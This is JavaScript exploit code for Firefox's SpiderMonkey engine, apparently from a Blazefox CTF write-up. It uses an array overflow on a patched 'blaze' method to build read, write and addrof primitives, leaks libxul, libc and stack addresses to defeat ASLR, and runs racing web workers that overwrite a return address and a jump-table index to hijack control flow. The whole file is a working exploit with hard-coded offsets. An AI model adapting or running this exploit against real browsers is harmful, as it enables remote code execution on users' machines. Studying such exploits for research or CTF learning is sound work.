// IMPORTANT
// browser.dom.window.dump.enabled to be set to true
// privacy.reduceTimerPrecision must be set to false

function print(x) {
    if(document != undefined) { document.getElementById('log').value += x + '\n'; }
    //console.log(x);
}

const attack_thread_sleep = false;
const attack_thread_dump_hits = false;
const attack_thread_num = 1;
const victim_thread_sleep = true;

async function attack() {
        // new Array vs [] ensures that the array is allocated
        // from the nursery as it does in firefox. But not in js.exe.
        smalls = new Array(1, 2, 3, 4);
        U8A = new Uint8Array(32);

        print('[*] smalls is hella blazin rn..');
        smalls.blaze();

        const overflow_index = 11;

        //if(U8A.byteLength < 0x100) { throw 'The corruption of the length did not work out, aborting.'; }
        //print("new length " + U8A.byteLength);

        saved_base = smalls[13]
        function write(addr, x) {
                smalls[overflow_index + 2] = Addr.asDouble();
                U8A.set(LengthOrValues);
        }

        function read(addr, len) {
                smalls[overflow_index + 2] = addr.asDouble();
                return U8A.slice(0, len);
        }

        function readptr(addr, len) {
                return new Int64(read(addr, 8));
        }

        function addrof(addr) {
                smalls[overflow_index + 2] = saved_base;
                smalls[14] = addr;
                return Int64.fromJSValue(U8A.slice(0, 8));
        }


        AB1 = new ArrayBuffer(1);
        AB1Address = addrof(AB1);

				// The bellow offsets needs to change based on libxul, libc, and ld-linux versions
				libxul_base_offset = 0x7b9fb08 // _ZL23emptyObjectSlotsHeaders + 8
        execve_got_entry_offset = 0x91b1898
        libc_execve_offset = 0xddb40
        _dl_fatal_printf_got_entry_offset = 0x1f80f8
        _dl_fatal_printf_offset = 0xef90
        environ_offset = 0x38290

				no_mach_other_environ_offset = 0x1f9eb8
				libxul_hell_writable_place_offset = 0x91b4030; // first writable place in libxul + 8
				//libxul_target = new Int64(0x009d7700);  // __stack_chk_fail@plt, not got!
                                libc_target = new Int64(0x00120f31);  // ____longjmp_chk

				// current gadget in libxul.so: 0x539cb2c (_ZN2js3jit19TraceJitActivationsEP9JSContextP8JSTracer+300)	
				// return address of js::jit::TraceJitActivation (_ZN2js2gc9GCRuntime18traceRuntimeCommonEP8JSTracerNS1_18TraceOrMarkRuntimeE+113)
				// XXX: change all of the below variables if choosing another gadget
				return_address_offset_from_libxul = 0x515f541; 
				stack_offset_return_address = 0x1c8
				rsp_offset_to_index = new Int64(0xa0);
				jump_table_offset_from_libxul = 0x7bd6210 // jump table of the js::jit::TraceJitActivation

				// START THE LEAKING!
        myaddr = addrof(smalls);
        leak_addr = readptr(Add(myaddr, 8))
        libxul_base = Sub(leak_addr, libxul_base_offset)
        print("LIBXUL_BASE: " + libxul_base)

        execve = readptr(Add(libxul_base, execve_got_entry_offset));
        libc_base = Sub(execve, libc_execve_offset)
        print("LIBC BASE:" + libc_base)

				environ_ptr = readptr(Add(libc_base, no_mach_other_environ_offset));
        environ = readptr(environ_ptr)
        print("ENVIRON:" + environ);

        result = read(environ, 8);
        var string = new TextDecoder().decode(result);
        print(string)
				print("MAYBE MAYBE MAYBE:" + Sub(environ_ptr, 0x30c8));
				maybe_stack_start = readptr(Sub(environ_ptr, 0x30c8))

	
				return_address = Add(libxul_base, return_address_offset_from_libxul)
				rsp_value_on_gadget = Sub(maybe_stack_start, 0x2500 - 0x3e0)
				print("STACK GADGET:" + rsp_value_on_gadget + " rsp offset " + rsp_offset_to_index);

				libxul_hell_writable_place = Add(libxul_base, new Int64(libxul_hell_writable_place_offset));
				jump_table_offsets_addr  = Add(new Int64(libxul_base), new Int64(jump_table_offset_from_libxul))
				overwritten_new_index = RShift1(RShift1(Sub(libxul_hell_writable_place, jump_table_offsets_addr)))
	                        // overwritten_new_offset = Sub(Add(libxul_base, libxul_target), jump_table_offsets_addr)
				overwritten_new_offset = Sub(Add(libc_base, libc_target), jump_table_offsets_addr)
				dump("libxul hell address: " + libxul_hell_writable_place + "\n");
				dump("jump table offsets address: " + jump_table_offsets_addr + "\n");
				dump("new offset : " + overwritten_new_offset + "\n");
				dump("new index : " + overwritten_new_index + "\n");


				// reset smalls and other stuff to avoid crashing
	      smalls[overflow_index + 2] = saved_base;
				smalls = [0]
				U8A = [0]

				attack_thread_code = `
					importScripts('file:///home/jianhao/poc/blazefox/writeup/exploits/js_utils/utils.js');
					importScripts('file:///home/jianhao/poc/blazefox/writeup/exploits/js_utils/int64.js');
					async function attack_thread() {
					const thread_id = THREAD_ID;
					const overflow_index = 11;

					const smalls = new Array(1, 2, 3, 4);
					const U8A = new Uint32Array(16);
					smalls.blaze();

					const smalls2 = new Array(1,2,3,4);
					const U8A2 = new Uint8Array(16);
					smalls2.blaze();

					const smalls3 = new Array(1,2,3,4);
					const U8A3 = new Uint8Array(16);
					smalls3.blaze();
                                        
					const smalls4 = new Array(1,2,3,4);
					const U8A4 = new Uint8Array(16);
					smalls4.blaze();


 					//console.log("murder_victim: " + new Int64(${rsp_value_on_gadget}));
					murder_victim = new Int64(${rsp_value_on_gadget});
          murder_victim = Add(murder_victim, new Int64(${rsp_offset_to_index}));
					stack_addr_for_ret_value = Add(${rsp_value_on_gadget}, ${stack_offset_return_address})
					correct_return_address = new Int64(${return_address})

					// overwrite index for jump table
					offset = new Int64("${overwritten_new_offset}")
					smalls3[overflow_index + 2] = new Int64(${libxul_hell_writable_place}).asDouble();
					U8A3.set(offset.bytes());

					what_to_write = new Int64("${overwritten_new_index}").bytes()

					smalls[overflow_index + 2] = stack_addr_for_ret_value.asDouble();
					smalls2[overflow_index + 2] = stack_addr_for_ret_value.asDouble();
					smalls3[overflow_index + 2] = murder_victim.asDouble();
					smalls4[overflow_index + 2] = murder_victim.asDouble();
		
					//await new Promise(r => setTimeout(r, 3000)); // the princess' sister needs to sleep too

					dump("starting thread ["+thread_id+"]\\n"); 

					b = Uint8Array.from(correct_return_address.bytes())
					correct_bytes = new Uint32Array(b.buffer)

					while (true) {
						// new broken check probably because optimized away
						// if (U8A[0] == correct_bytes[0]) {

						// old, reliable check
						read = U8A2.slice(0, 8)
						myretaddr = new Int64(read);
						if (Eq(myretaddr, correct_return_address)) {
							U8A3.set(what_to_write); // it is divided by 4!
						        if (${attack_thread_dump_hits}) {
								dump("["+thread_id+"] " + " HIT " + performance.now() + "\\n");
							}
							U8A4.set([0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00]);
						}

						if (${attack_thread_sleep}) {
							await new Promise(r => setTimeout(r, Math.random())); // the princess' sister needs to sleep too
						}
					}
				}
				(async() => {
				  await attack_thread();
				  await new Promise(r => setTimeout(r, 600000)); // the princess' sister needs to sleep too
				})();
				`


				for (var i = 0; i < attack_thread_num; i++) {
					new_str = attack_thread_code.replace("THREAD_ID", i)
					blob = new Blob([new_str], {type: "application/javascript"});
					var worker = new Worker(URL.createObjectURL(blob));
					await new Promise(r => setTimeout(r, 1)); // give chance for thread to start
				}

				//await new Promise(r => setTimeout(r, 200)); // sleep little princess

		
        // generate gadgets
				window.dump("STARTING THE GADGET RUN :" + performance.now() + "\n");
				a = [0,1,2,3,4,"ciao"]
				while (true) {
					for (var i =0; i < 2000; i++) {
						print("done " + a + i);
					}
					// TODO looks like sleep here is necessary
					if (victim_thread_sleep) {
							await new Promise(r => setTimeout(r, 0.001)); // sleep little princess
					}
				}
}

(async() => {
  console.log('before start');
        
  await new Promise(r => setTimeout(r, 1000));
  await attack();
  
  console.log('after start');
})();
